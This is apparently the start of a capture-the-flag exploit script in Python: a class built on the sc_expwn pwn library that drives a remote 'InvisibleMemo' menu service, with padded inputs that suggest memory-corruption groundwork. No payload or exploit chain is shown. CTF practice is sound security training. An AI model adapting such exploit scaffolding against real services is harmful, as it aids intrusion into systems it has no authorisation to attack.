from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py

class InvisibleMemo:
    def __init__(self, conn, key, size = 0x40):
        self.recvuntil      = conn.recvuntil
        self.recv           = conn.recv
        self.unrecv         = conn.unrecv
        self.sendline       = conn.sendline
        self.send           = conn.send
        self.sendafter      = conn.sendafter
        self.sendlineafter  = conn.sendlineafter

        self.sendlineafter('> ', str(size))
        self.sendafter('... ', key)
        self.key = key[:key.find('\x00')+1].strip('\x00')

    def add(self, size, data, ofs = 0, unrecv = False):
        self.sendlineafter('> ', '1')
        self.sendafter('... ', self.key if len(self.key) > 0 else '\x00')
        self.sendlineafter('size > ', str(size))
        self.sendlineafter('offset > ', str(ofs))
        if ofs < size:
            if data is not None:
                self.sendafter('description > ', data)
            s = self.recvuntil('id ')
            idx = int(self.recvuntil('\n', drop=True))

            if unrecv:
                self.unrecv(s)
            return idx

    def delete(self, idx, x = 0):
        self.sendafter('> ', '2'.ljust(0xb, '\x00') + p(x)[0])
        self.sendlineafter('id > ', str(idx))

    def newkey(self, key):
        self.sendlineafter('> ', '9')
        self.sendafter('... ', key)
        self.key = key[:key.find('\x00')+1].strip('\x00')


